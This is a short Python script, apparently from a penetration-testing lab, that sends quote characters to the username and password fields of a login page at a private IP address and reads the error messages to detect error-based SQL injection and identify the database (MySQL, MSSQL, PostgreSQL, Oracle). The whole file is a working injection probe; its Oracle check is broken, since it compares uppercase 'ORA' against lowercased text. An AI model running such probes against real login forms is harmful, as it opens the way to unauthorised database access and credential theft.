import requests


url = "http://192.168.56.135:2009/login.php"
payload = "'\""
data = {'uname': ''}
for c in payload:
    x = requests.post(url, data={'uname': c, 'pw': c})
    if "mysql" in x.text.lower():
        print("Injectable MySQL detected")
        break
    elif "native client" in x.text.lower():
        print("Injectable MSSQL detected")
        break
    elif "syntax error" in x.text.lower():
        print("Injectable PostGRES detected")
        break
    elif "ORA" in x.text.lower():
        print("Injectable Oracle detected")
        break
    else:
        print("Error-based not found")
